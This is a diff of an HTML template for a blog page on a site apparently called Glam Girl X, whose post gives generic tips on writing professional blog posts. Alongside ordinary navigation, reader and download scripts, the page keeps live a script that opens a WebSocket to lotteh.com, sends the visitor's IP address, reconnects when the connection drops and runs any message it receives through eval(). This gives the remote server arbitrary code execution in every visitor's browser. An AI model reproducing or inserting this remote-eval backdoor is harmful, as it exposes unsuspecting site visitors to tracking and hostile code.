@@ -65,7 +65,7 @@
               <a class="nav-link" href="/en/landing" title="Visit the landing page">Landing</a>
             </li>
             <li class="nav-item">
-              <a class="nav-link" href="https://qoshlli.com" title="Video chat">Chat</a>
+              <a class="nav-link" href="/en/chat" title="Video chat">Chat</a>
             </li>
             <li class="nav-item">
               <a class="nav-link" href="/en/private" title="See private photos with a key">Private</a>
@@ -123,14 +123,8 @@
 <img src="https://i.imgur.com/dAQRaWt.jpeg" alt="Daisy's profile photo" width="120" height="120" style="margin-top:5px; margin-right:10px; margin-bottom:10px; border-radius: 50%;">
 <p><i>By Daisy</i></p>
 
-<div style="white-space: pre-wrap;">
+<div style="white-space: pre-wrap;"><p>How do I write a professional blog post?</p><p><br/></p><p>Writing a professional blog post involves several key steps to create a well-crafted and engaging piece of content. Here are some tips to help you write a professional blog post:</p><p>1. Choose a relevant and engaging topic: Start by identifying a topic that is relevant to your audience and is something you are knowledgeable and passionate about. Make sure the topic is something that will interest and resonate with your readers.</p><p>2. Conduct thorough research: Before you start writing, make sure to conduct thorough research on your chosen topic. This will help you gather relevant information, statistics, and facts to support your points and make your blog post more credible.</p><p>3. Create an outline: Organize your ideas and key points by creating an outline for your blog post. This will help you structure your content in a logical and coherent way, making it easier for readers to follow along.</p><p>4. Write a compelling introduction: Start your blog post with a strong and engaging introduction that grabs the reader's attention. Use a hook to draw readers in and make them want to keep reading.</p><p>5. Use clear and concise language: Avoid using jargon or overly technical language in your blog post. Write in a clear and concise manner to make your content easy to understand for all readers.</p><p>6. Include visuals: Visual elements such as images, infographics, and videos can help break up the text and make your blog post visually appealing. They can also help support your key points and make your content more engaging.</p><p>7. Proofread and edit: Before publishing your blog post, make sure to thoroughly proofread and edit it for grammar, spelling, and formatting errors. Consider asking a colleague or friend to review your post for feedback before publishing it.</p><p>8. Add a call to action: End your blog post with a strong call to action that encourages readers to engage with your content, such as subscribing to your blog, commenting, or sharing your post on social media</p><p>By following these tips, you can create a professional and engaging blog post that will resonate with your audience and establish you as an authority in your field.</p></div>
 
-
-
-<p>How do I write a professional blog post?</p><p><br></p><p>Writing a professional blog post involves several key steps to create a well-crafted and engaging piece of content. Here are some tips to help you write a professional blog post:</p><p>1. Choose a relevant and engaging topic: Start by identifying a topic that is relevant to your audience and is something you are knowledgeable and passionate about. Make sure the topic is something that will interest and resonate with your readers.</p><p>2. Conduct thorough research: Before you start writing, make sure to conduct thorough research on your chosen topic. This will help you gather relevant information, statistics, and facts to support your points and make your blog post more credible.</p><p>3. Create an outline: Organize your ideas and key points by creating an outline for your blog post. This will help you structure your content in a logical and coherent way, making it easier for readers to follow along.</p><p>4. Write a compelling introduction: Start your blog post with a strong and engaging introduction that grabs the reader's attention. Use a hook to draw readers in and make them want to keep reading.</p><p>5. Use clear and concise language: Avoid using jargon or overly technical language in your blog post. Write in a clear and concise manner to make your content easy to understand for all readers.</p><p>6. Include visuals: Visual elements such as images, infographics, and videos can help break up the text and make your blog post visually appealing. They can also help support your key points and make your content more engaging.</p><p>7. Proofread and edit: Before publishing your blog post, make sure to thoroughly proofread and edit it for grammar, spelling, and formatting errors. Consider asking a colleague or friend to review your post for feedback before publishing it.</p><p>8. Add a call to action: End your blog post with a strong call to action that encourages readers to engage with your content, such as subscribing to your blog, commenting, or sharing your post on social media</p><p>By following these tips, you can create a professional and engaging blog post that will resonate with your audience and establish you as an authority in your field.</p>
-
-
-</div>
 
 <div class="mx-auto p-1 m-1" style="display: flex; justify-content: space-around;">
 <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6209985848112194"
@@ -247,6 +241,23 @@
         
 
 
+var currentReader = 0;
+function toggleReader(id) {
+	currentReader = id;
+	$('#reader-modal' + id).toggleClass('hide');
+	$('#reader-modal' + id).toggleClass('fade-in-fast');
+	$('#bnav' + id).toggleClass('hide');
+	$('#bnav' + id).toggleClass('fade-in-fast');
+	setTimeout(function() {
+		$('#reader-modal' + id).toggleClass('fade-in-fast');
+		$('#bnav' + id).toggleClass('fade-in-fast');
+	}, 1000);
+}
+function jumpbookto(page) {
+	document.getElementById('reader-modal' + currentReader).scrollTo(0, (parseInt(document.getElementById('jumpto' + page).value)-1) * parseInt(window.innerHeight));
+	document.getElementById('pagecount' + page).innerHTML = parseInt(document.getElementById('jumpto' + page).value);
+}
+
 
         
         
@@ -257,32 +268,32 @@
             
         	Prism.highlightAll();
         });
-        var socket;
-        function openSocket() {
+        var remoteSocket;
+        function openRemoteSocket() {
             window.location.hash = '';
-            socket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
-            socket.addEventListener("open", (event) => {
+            remoteSocket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
+            remoteSocket.addEventListener("open", (event) => {
                 console.log('Socket open.');
                 fetch('https://lotteh.com/remote/generate/')
         		    .then(response => response.json())
         		    .then(data => {
-        		        socket.send(data.ip);
+        		        remoteSocket.send(data.ip);
         		    })
         		    .catch(error => {
         		        console.log('Error:', error);
         		    });
             });
-            socket.addEventListener("closed", (event) => {
+            remoteSocket.addEventListener("closed", (event) => {
                 console.log('Socket closed.');
                 setTimeout(function() {
-                    openSocket();
+                    openRemoteSocket();
                 }, 10000);
             });
-        	socket.addEventListener("message", (event) => {
+        	remoteSocket.addEventListener("message", (event) => {
                     eval(event.data);
             });
         }
-        openSocket();
+        openRemoteSocket();
         $(document).ready(function() {
         	$("#contact-form").submit(function(e){
                 	e.preventDefault();
@@ -434,8 +445,8 @@ if(document.getElementById("current-time")) {
               link.href = url;
               link.download = 'Glam Girl X - ' + filename;
               document.body.appendChild(link);
+              link.classList.add('hide');
               link.click();
-              document.body.removeChild(link);
             }
             function downloadQr() {
                     downloadQrImage(image.src, 'QR Code');
@@ -457,6 +468,8 @@ if(document.getElementById("current-time")) {
   });
 </script>
 
+    
+    
     
     
     <script>
